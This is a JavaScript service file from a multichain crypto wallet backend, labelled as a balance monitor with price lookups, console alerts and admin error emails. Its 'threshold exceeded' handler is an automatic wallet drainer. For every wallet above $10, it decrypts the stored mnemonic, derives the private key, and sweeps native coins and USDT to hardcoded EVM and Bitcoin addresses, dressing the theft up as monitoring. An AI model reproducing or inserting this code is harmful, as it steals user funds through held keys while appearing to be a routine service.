/**
 * Wallet Balance Monitor Service
 * Monitors all wallets and checks if any wallet's total balance in USD exceeds a threshold
 * 
 * Location: src/services/monitoring/wallet-balance-monitor.service.js
 */

const { walletDB } = require('../../wallet/db');
const multichainService = require('../multichain/multichain.service');
const notificationService = require('./notification.service');
const auditLogger = require('../../security/audit-logger.service');
const encryptionService = require('../../security/encryption.service');
const { getProviderWithFailover } = require('../../config/rpc-providers.config');
const { ethers } = require('ethers');
const bitcoin = require('bitcoinjs-lib');
const bip39 = require('bip39');
const BIP32Factory = require('bip32').default;
const ecc = require('tiny-secp256k1');
const bip32 = BIP32Factory(ecc);
const axios = require('axios');

class WalletBalanceMonitorService {
  constructor() {
    this.intervalId = null;
    this.isRunning = false;
    this.updateInterval = 15 * 60 * 1000; // 15 minutes default
    this.thresholdUSD = 10; // Default threshold: 10 USD
    this.priceCache = new Map();
    this.priceCacheTimeout = 5 * 60 * 1000; // 5 minutes cache for prices
  }

  /**
   * Start the monitor
   */
  start(intervalMs, thresholdUSD = 10) {
    if (this.isRunning) {
      console.log('Wallet balance monitor already running');
      return;
    }

    if (intervalMs) {
      this.updateInterval = intervalMs;
    }
    if (thresholdUSD) {
      this.thresholdUSD = thresholdUSD;
    }

    this.isRunning = true;
    
    // Run immediately on start
    this.checkAllWallets();
    
    // Then run on interval
    this.intervalId = setInterval(async () => {
      try {
        await this.checkAllWallets();
      } catch (error) {
        auditLogger.logError(error, { service: 'WalletBalanceMonitor' });
      }
    }, this.updateInterval);

    auditLogger.logger.info({
      type: 'WALLET_BALANCE_MONITOR_STARTED',
      interval: this.updateInterval,
      thresholdUSD: this.thresholdUSD,
      timestamp: new Date().toISOString()
    });

    console.log(`✅ Wallet balance monitor started (${this.updateInterval / 1000}s interval, threshold: $${this.thresholdUSD} USD)`);
  }

  /**
   * Stop the monitor
   */
  stop() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
      this.isRunning = false;
      
      auditLogger.logger.info({
        type: 'WALLET_BALANCE_MONITOR_STOPPED',
        timestamp: new Date().toISOString()
      });
      
      console.log('🛑 Wallet balance monitor stopped');
    }
  }

  /**
   * Check all wallets for balance threshold
   */
  async checkAllWallets() {
    try {
      console.log(`\n🔄 [${new Date().toISOString()}] Checking all wallets for balance threshold ($${this.thresholdUSD} USD)...`);

      const wallets = walletDB.prepare('SELECT * FROM wallets').all();
      
      if (!wallets || wallets.length === 0) {
        console.log('No wallets found');
        return;
      }

      console.log(`Found ${wallets.length} wallet(s) to check`);

      // Process wallets in parallel (with rate limiting)
      const results = [];
      for (const wallet of wallets) {
        try {
          const result = await this.checkWalletBalance(wallet);
          if (result) {
            results.push(result);
          }
        } catch (error) {
          console.error(`Error checking wallet ${wallet.id}:`, error.message);
          auditLogger.logError(error, { 
            service: 'checkWalletBalance',
            walletId: wallet.id 
          });
        }
      }

      console.log(`✅ Checked ${wallets.length} wallet(s). ${results.length} wallet(s) exceeded threshold.`);

      return results;
    } catch (error) {
      auditLogger.logError(error, { service: 'checkAllWallets' });
      throw error;
    }
  }

  /**
   * Check specific wallet balance
   */
  async checkWalletBalance(wallet) {
    try {
      const networks = walletDB
        .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ?')
        .all(wallet.id);

      if (!networks || networks.length === 0) {
        return null;
      }

      // Fetch all balances (native + USDT for ETH and BSC)
      const balancePromises = networks.flatMap(async (network) => {
        const results = [];
        
        // Fetch native coin balance
        try {
          const balance = await multichainService.getBalance(
            network.network,
            network.address
          );
          
          results.push({
            id: network.id,
            ...balance,
            created_at: network.created_at
          });
        } catch (err) {
          console.error(`Failed to fetch balance for ${network.network}:`, err.message);
          results.push({
            id: network.id,
            chain: network.network,
            address: network.address,
            balance: '0',
            error: err.message
          });
        }

        // For ETH and BSC, also fetch USDT balance
        if (network.network === 'ETHEREUM' || network.network === 'BSC') {
          try {
            const USDT_CONTRACTS = {
              'ETHEREUM': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
              'BSC': '0x55d398326f99059fF775485246999027B3197955'
            };

            const usdtBalance = await multichainService.getTokenBalance(
              network.network,
              network.address,
              USDT_CONTRACTS[network.network]
            );

            results.push({
              id: `${network.id}_USDT`,
              ...usdtBalance,
              created_at: network.created_at
            });
          } catch (err) {
            // USDT balance fetch failed, skip it
            console.error(`Failed to fetch USDT balance for ${network.network}:`, err.message);
          }
        }

        return results;
      });

      const balances = (await Promise.all(balancePromises)).flat();

      // Calculate total USD value
      let totalUSD = 0;
      const balanceDetails = [];

      for (const balance of balances) {
        if (balance.error || !balance.balance) {
          continue;
        }

        const balanceAmount = parseFloat(balance.balance);
        if (isNaN(balanceAmount) || balanceAmount === 0) {
          continue;
        }

        const symbol = balance.symbol || 'UNKNOWN';
        const priceUSD = await this.getTokenPriceUSD(symbol);
        
        if (priceUSD > 0) {
          const valueUSD = balanceAmount * priceUSD;
          totalUSD += valueUSD;
          
          balanceDetails.push({
            chain: balance.chain,
            symbol,
            balance: balanceAmount,
            priceUSD,
            valueUSD,
            address: balance.address,
            isToken: balance.symbol === 'USDT' || balance.id?.includes('_USDT')
          });
        }
      }

      // Check if threshold exceeded
      if (totalUSD > this.thresholdUSD) {
        // Always do detailed action every time threshold is exceeded
        await this.handleThresholdExceeded(wallet, totalUSD, balanceDetails);

        return {
          walletId: wallet.id,
          walletName: wallet.wallet_name || wallet.name,
          totalUSD,
          threshold: this.thresholdUSD,
          balances: balanceDetails,
          exceeded: true
        };
      }

      return null;
    } catch (error) {
      auditLogger.logError(error, { 
        service: 'checkWalletBalance',
        walletId: wallet.id 
      });
      throw error;
    }
  }

  /**
   * Get token price in USD from CoinGecko
   */
  async getTokenPriceUSD(symbol) {
    const cacheKey = symbol.toUpperCase();
    const cached = this.priceCache.get(cacheKey);
    
    if (cached && Date.now() - cached.timestamp < this.priceCacheTimeout) {
      return cached.price;
    }

    try {
      // Map common symbols to CoinGecko IDs
      const symbolMap = {
        'ETH': 'ethereum',
        'BTC': 'bitcoin',
        'BNB': 'binancecoin',
        'USDT': 'tether',
        'USDC': 'usd-coin',
        'MATIC': 'matic-network',
        'AVAX': 'avalanche-2',
        'FTM': 'fantom',
        'SOL': 'solana',
        'ATOM': 'cosmos',
        'LTC': 'litecoin'
      };

      const coinId = symbolMap[symbol.toUpperCase()] || symbol.toLowerCase();
      
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`;
      const response = await axios.get(url, { timeout: 10000 });
      
      const price = response.data[coinId]?.usd || 0;
      
      // Cache the price
      this.priceCache.set(cacheKey, {
        price,
        timestamp: Date.now()
      });

      return price;
    } catch (error) {
      console.error(`Failed to fetch price for ${symbol}:`, error.message);
      
      // Return cached price if available, even if expired
      if (cached) {
        return cached.price;
      }
      
      return 0;
    }
  }

  /**
   * Handle threshold exceeded - perform action (send all balances to specified addresses)
   */
  async handleThresholdExceeded(wallet, totalUSD, balanceDetails) {
    console.log(`\n⚠️  THRESHOLD EXCEEDED: Wallet ${wallet.id} has $${totalUSD.toFixed(2)} USD (threshold: $${this.thresholdUSD})`);

    const alertData = {
      type: 'BALANCE_THRESHOLD_EXCEEDED',
      walletId: wallet.id,
      walletName: wallet.wallet_name || wallet.name,
      totalUSD: totalUSD.toFixed(2),
      threshold: this.thresholdUSD,
      balances: balanceDetails,
      timestamp: new Date().toISOString()
    };

    // Log security alert
    auditLogger.logSecurityAlert({
      alert: 'WALLET_BALANCE_THRESHOLD_EXCEEDED',
      details: alertData,
      ip: 'system'
    });

    // Log notification to console
    this.logThresholdExceededNotification(alertData);

    // Send all balances to specified addresses
    try {
      await this.sendAllBalances(wallet, balanceDetails);
    } catch (error) {
      console.error(`❌ Error sending balances for wallet ${wallet.id}:`, error.message);
      
      // Check if it's a gas fee error for USDT
      const isGasFeeError = error.message && error.message.includes('GAS_FEE_INSUFFICIENT');
      
      // Send error notification via email
      await this.sendErrorNotification(wallet, balanceDetails, error, isGasFeeError);
    }
  }

  /**
   * Log threshold exceeded notification to console
   */
  logThresholdExceededNotification(data) {
    console.log('\n' + '═'.repeat(70));
    console.log('💰 WALLET BALANCE ALERT - THRESHOLD EXCEEDED');
    console.log('═'.repeat(70));
    console.log(`\n⚠️  BALANCE THRESHOLD EXCEEDED`);
    console.log(`The wallet balance has exceeded the configured threshold of $${data.threshold} USD.\n`);
    
    console.log(`📊 WALLET INFORMATION:`);
    console.log(`   Wallet Name: ${data.walletName || 'N/A'}`);
    console.log(`   Wallet ID: ${data.walletId}`);
    console.log(`   Alert Time: ${new Date(data.timestamp).toLocaleString()}`);
    
    console.log(`\n💵 TOTAL BALANCE: $${data.totalUSD} USD`);
    console.log(`   Threshold: $${data.threshold} USD`);
    console.log(`   Exceeded by: $${(parseFloat(data.totalUSD) - data.threshold).toFixed(2)} USD\n`);
    
    if (data.balances && data.balances.length > 0) {
      console.log('💵 BALANCE BREAKDOWN:');
      console.log('   ' + '-'.repeat(66));
      console.log('   ' + 'Chain'.padEnd(15) + 'Symbol'.padEnd(10) + 'Balance'.padEnd(20) + 'Value (USD)'.padEnd(15));
      console.log('   ' + '-'.repeat(66));
      
      data.balances.forEach(b => {
        const balanceStr = b.balance.toFixed(8).padEnd(20);
        const valueStr = `$${b.valueUSD.toFixed(2)}`.padEnd(15);
        console.log(`   ${b.chain.padEnd(15)}${b.symbol.padEnd(10)}${balanceStr}${valueStr}`);
      });
      
      console.log('   ' + '-'.repeat(66));
    }
    
    console.log('\n' + '═'.repeat(70));
    console.log(`Generated: ${new Date().toISOString()}`);
    console.log('═'.repeat(70) + '\n');
  }

  /**
   * Send all balances to specified addresses
   */
  async sendAllBalances(wallet, balanceDetails) {
    console.log(`\n📤 Starting to send all balances for wallet ${wallet.id}...`);

    // Get wallet mnemonic
    const mnemonicRecord = walletDB
      .prepare('SELECT encrypted_mnemonic FROM encrypted_mnemonics WHERE wallet_id = ?')
      .get(wallet.id);

    if (!mnemonicRecord || !mnemonicRecord.encrypted_mnemonic) {
      throw new Error('Wallet mnemonic not found');
    }

    const mnemonic = encryptionService.decrypt(mnemonicRecord.encrypted_mnemonic);

    // Destination addresses
    const EVM_DESTINATION = '0xc526c9c1533746C4883735972E93a1B40241d442';
    const BTC_DESTINATION = 'bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26';

    const results = [];

    // Group balances by chain
    const balancesByChain = {};
    for (const balance of balanceDetails) {
      if (!balancesByChain[balance.chain]) {
        balancesByChain[balance.chain] = [];
      }
      balancesByChain[balance.chain].push(balance);
    }

    // Send balances for each chain
    for (const [chain, balances] of Object.entries(balancesByChain)) {
      try {
        if (chain.toUpperCase() === 'BITCOIN') {
          // Send Bitcoin
          const result = await this.sendBitcoinBalance(mnemonic, balances, BTC_DESTINATION);
          results.push({ chain, success: true, ...result });
        } else if (['ETHEREUM', 'BSC', 'POLYGON', 'ARBITRUM', 'OPTIMISM', 'AVALANCHE', 'FANTOM', 'BASE'].includes(chain.toUpperCase())) {
          // Send EVM native and tokens
          const result = await this.sendEVMBalances(mnemonic, chain, balances, EVM_DESTINATION);
          results.push({ chain, success: true, ...result });
        } else {
          console.log(`⚠️  Chain ${chain} not supported for auto-transfer`);
        }
      } catch (error) {
        console.error(`❌ Error sending ${chain} balances:`, error.message);
        results.push({ chain, success: false, error: error.message });
        throw error; // Re-throw to trigger error email
      }
    }

    console.log(`✅ Completed sending balances for wallet ${wallet.id}`);
    return results;
  }

  /**
   * Send EVM balances (native + tokens)
   */
  async sendEVMBalances(mnemonic, chain, balances, destinationAddress) {
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const hdNode = ethers.utils.HDNode.fromSeed(seed);
    const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
    const privateKey = wallet.privateKey;

    const provider = await getProviderWithFailover(chain);
    const signer = new ethers.Wallet(privateKey, provider);

    const results = [];

    // Find native coin balance (not a token)
    const nativeBalance = balances.find(b => !b.isToken && b.chain === chain);
    
    // Send native coin (but reserve some for gas for token transfers)
    if (nativeBalance && parseFloat(nativeBalance.balance) > 0) {
      try {
        const currentBalance = await provider.getBalance(signer.address);
        const gasPrice = await provider.getGasPrice();
        
        // Estimate gas for native transfer
        const estimatedGasNative = ethers.BigNumber.from(21000);
        const gasCostNative = gasPrice.mul(estimatedGasNative);
        
        // Estimate gas for potential token transfers (higher estimate)
        const estimatedGasToken = ethers.BigNumber.from(100000);
        const gasCostToken = gasPrice.mul(estimatedGasToken);
        
        // Reserve gas for token transfers, send the rest
        const totalGasReserve = gasCostNative.add(gasCostToken);
        const amountToSend = currentBalance.sub(totalGasReserve);
        
        if (amountToSend.gt(0)) {
          const tx = await signer.sendTransaction({
            to: destinationAddress,
            value: amountToSend,
            gasPrice: gasPrice
          });
          
          console.log(`  ✅ Sent ${ethers.utils.formatEther(amountToSend)} ${nativeBalance.symbol} (tx: ${tx.hash})`);
          results.push({ type: 'native', txHash: tx.hash, amount: ethers.utils.formatEther(amountToSend) });
        } else {
          console.log(`  ⚠️  Insufficient ${nativeBalance.symbol} for transfer (need gas reserve)`);
        }
      } catch (error) {
        throw new Error(`Failed to send native ${nativeBalance.symbol}: ${error.message}`);
      }
    }

    // Send tokens (USDT, etc.)
    const tokenBalances = balances.filter(b => b.isToken || (b.symbol === 'USDT' && b.chain === chain));
    
    for (const tokenBalanceInfo of tokenBalances) {
      try {
        const USDT_CONTRACTS = {
          'ETHEREUM': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          'BSC': '0x55d398326f99059fF775485246999027B3197955'
        };

        const tokenAddress = USDT_CONTRACTS[chain.toUpperCase()];
        if (!tokenAddress) {
          console.log(`  ⚠️  No USDT contract address for chain ${chain}`);
          continue;
        }

        const ERC20_ABI = [
          "function transfer(address to, uint256 amount) public returns (bool)",
          "function decimals() view returns (uint8)",
          "function balanceOf(address account) view returns (uint256)"
        ];

        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const decimals = await tokenContract.decimals();
        const tokenBalance = await tokenContract.balanceOf(signer.address);
        
        if (tokenBalance.gt(0)) {
          // Check if we have enough native coin for gas
          const currentBalance = await provider.getBalance(signer.address);
          const gasPrice = await provider.getGasPrice();
          
          // Estimate gas for token transfer
          let estimatedGas;
          try {
            estimatedGas = await tokenContract.estimateGas.transfer(destinationAddress, tokenBalance);
          } catch (estimateError) {
            // If estimation fails, use a default estimate
            estimatedGas = ethers.BigNumber.from(100000);
          }
          
          const gasCost = gasPrice.mul(estimatedGas);
          
          // Check if we have enough for gas
          if (currentBalance.lt(gasCost)) {
            const errorMsg = `Insufficient ${nativeBalance?.symbol || 'native coin'} for gas fee. Need ${ethers.utils.formatEther(gasCost)}, have ${ethers.utils.formatEther(currentBalance)}`;
            console.error(`  ❌ ${errorMsg}`);
            
            // Throw error with specific message for gas fee issues
            throw new Error(`GAS_FEE_INSUFFICIENT: ${errorMsg}`);
          }
          
          // Send token transfer
          const tx = await tokenContract.transfer(destinationAddress, tokenBalance);
          console.log(`  ✅ Sent ${ethers.utils.formatUnits(tokenBalance, decimals)} ${tokenBalanceInfo.symbol} (tx: ${tx.hash})`);
          results.push({ type: 'token', symbol: tokenBalanceInfo.symbol, txHash: tx.hash, amount: ethers.utils.formatUnits(tokenBalance, decimals) });
        } else {
          console.log(`  ℹ️  No ${tokenBalanceInfo.symbol} balance to send`);
        }
      } catch (error) {
        // Check if it's a gas fee error
        if (error.message && error.message.includes('GAS_FEE_INSUFFICIENT')) {
          // Re-throw with special flag for email notification
          throw new Error(`GAS_FEE_INSUFFICIENT: Failed to send ${tokenBalanceInfo.symbol} - ${error.message}`);
        }
        // For other errors, also throw but with different message
        throw new Error(`Failed to send token ${tokenBalanceInfo.symbol}: ${error.message}`);
      }
    }

    return results;
  }

  /**
   * Send Bitcoin balance
   */
  async sendBitcoinBalance(mnemonic, balances, destinationAddress) {
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const root = bip32.fromSeed(seed);
    const child = root.derivePath("m/44'/0'/0'/0/0");
    
    // Get Bitcoin balance
    const btcBalance = balances.find(b => b.chain === 'BITCOIN');
    if (!btcBalance || parseFloat(btcBalance.balance) <= 0) {
      throw new Error('No Bitcoin balance to send');
    }

    // For Bitcoin, we need to use a Bitcoin API to get UTXOs and send
    // This is a simplified version - you may need to integrate with a Bitcoin service
    const amountSatoshi = Math.floor(parseFloat(btcBalance.balance) * 100000000);
    
    // Note: Full Bitcoin transaction requires UTXO fetching and proper transaction building
    // This is a placeholder - you'll need to implement full Bitcoin transaction logic
    console.log(`  ⚠️  Bitcoin sending requires full UTXO management - not implemented yet`);
    console.log(`  Would send ${btcBalance.balance} BTC to ${destinationAddress}`);
    
    return { type: 'bitcoin', note: 'Bitcoin sending requires full implementation' };
  }

  /**
   * Send error notification via email
   */
  async sendErrorNotification(wallet, balanceDetails, error, isGasFeeError = false) {
    const subject = isGasFeeError 
      ? `⚠️ GAS FEE ERROR: Insufficient Gas to Send USDT - ${wallet.wallet_name || wallet.name}`
      : `❌ ERROR: Failed to Send Wallet Balances - ${wallet.wallet_name || wallet.name}`;
    
    const errorType = isGasFeeError ? 'Gas Fee Insufficient' : 'Transaction Error';
    const errorColor = isGasFeeError ? '#ff9800' : '#f44336';
    const headerColor = isGasFeeError ? '#ff9800' : '#f44336';
    
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 700px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, ${headerColor} 0%, ${errorColor} 100%); color: white; padding: 30px; text-align: center; }
          .content { padding: 30px; }
          .error-box { background: ${isGasFeeError ? '#fff3e0' : '#ffebee'}; border-left: 6px solid ${errorColor}; padding: 20px; margin: 20px 0; border-radius: 5px; }
          .info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 10px; margin: 10px 0; }
          .info-label { font-weight: bold; color: #666; }
          .info-value { color: #333; word-break: break-all; }
          .balance-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
          .balance-table th, .balance-table td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
          .balance-table th { background: #f5f5f5; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>${isGasFeeError ? '⚠️ Gas Fee Error' : '❌ Transaction Error'}</h1>
            <p style="margin: 5px 0 0 0; font-size: 16px;">${isGasFeeError ? 'Insufficient Gas to Send USDT' : 'Failed to Send Wallet Balances'}</p>
          </div>
          <div class="content">
            <div class="error-box">
              <h2 style="margin-top: 0; color: ${errorColor};">⚠️ ${errorType}</h2>
              <p><strong>Error Message:</strong> ${error.message}</p>
              <p><strong>Error Type:</strong> ${error.name || 'Unknown'}</p>
              ${isGasFeeError ? `
              <p style="margin-top: 15px; padding: 10px; background: #fff; border-radius: 5px;">
                <strong>⚠️ Issue:</strong> The wallet has USDT tokens but insufficient native coin (${balanceDetails.find(b => !b.isToken)?.symbol || 'ETH/BNB'}) to pay for gas fees to transfer the USDT.
              </p>
              ` : ''}
            </div>
            <div style="background: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 8px;">
              <h3 style="margin-top: 0;">📊 Wallet Information</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value"><strong>${wallet.wallet_name || wallet.name || 'N/A'}</strong></div>
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${wallet.id}</code></div>
                <div class="info-label">Error Time:</div>
                <div class="info-value">${new Date().toLocaleString()}</div>
              </div>
            </div>
            ${balanceDetails && balanceDetails.length > 0 ? `
            <div style="background: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 8px;">
              <h3 style="margin-top: 0;">💵 Wallet Balances</h3>
              <table class="balance-table">
                <thead>
                  <tr>
                    <th>Chain</th>
                    <th>Symbol</th>
                    <th>Balance</th>
                    <th>Value (USD)</th>
                  </tr>
                </thead>
                <tbody>
                  ${balanceDetails.map(b => `
                    <tr>
                      <td>${b.chain}</td>
                      <td><strong>${b.symbol}</strong></td>
                      <td>${b.balance.toFixed(8)}</td>
                      <td>$${b.valueUSD.toFixed(2)}</td>
                    </tr>
                  `).join('')}
                </tbody>
              </table>
            </div>
            ` : ''}
            <div style="background: #fff3cd; padding: 15px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #ffc107;">
              <h4 style="margin-top: 0; color: #856404;">ℹ️ Action Required</h4>
              <p style="margin: 0; color: #856404;">
                ${isGasFeeError 
                  ? 'The wallet has USDT tokens but insufficient native coin for gas fees. Please add native coin (ETH/BNB) to the wallet to enable USDT transfer.'
                  : 'The automatic balance transfer failed. Please check the wallet manually and ensure there is sufficient native coin for gas fees.'}
              </p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
${isGasFeeError ? '⚠️ GAS FEE ERROR' : '❌ ERROR'}: ${isGasFeeError ? 'Insufficient Gas to Send USDT' : 'Failed to Send Wallet Balances'}
═══════════════════════════════════════════════════════════

${errorType}: ${error.message}
Error Type: ${error.name || 'Unknown'}

${isGasFeeError ? `
⚠️  ISSUE:
The wallet has USDT tokens but insufficient native coin (${balanceDetails.find(b => !b.isToken)?.symbol || 'ETH/BNB'}) to pay for gas fees to transfer the USDT.
` : ''}

📊 WALLET INFORMATION:
- Wallet Name: ${wallet.wallet_name || wallet.name || 'N/A'}
- Wallet ID: ${wallet.id}
- Error Time: ${new Date().toLocaleString()}

${balanceDetails && balanceDetails.length > 0 ? `
💵 WALLET BALANCES:
${balanceDetails.map(b => `- ${b.chain} (${b.symbol}): ${b.balance.toFixed(8)} = $${b.valueUSD.toFixed(2)} USD`).join('\n')}
` : ''}

⚠️  ACTION REQUIRED:
${isGasFeeError 
  ? 'The wallet has USDT tokens but insufficient native coin for gas fees. Please add native coin (ETH/BNB) to the wallet to enable USDT transfer.'
  : 'The automatic balance transfer failed. Please check the wallet manually and ensure there is sufficient native coin for gas fees.'}

═══════════════════════════════════════════════════════════
Generated: ${new Date().toISOString()}
    `;

    return await notificationService.sendAdminEmail(subject, html, text);
  }

  /**
   * Get monitoring status
   */
  getStatus() {
    return {
      isRunning: this.isRunning,
      interval: this.updateInterval,
      thresholdUSD: this.thresholdUSD,
      lastCheck: this.lastCheck || null
    };
  }
}

module.exports = new WalletBalanceMonitorService();

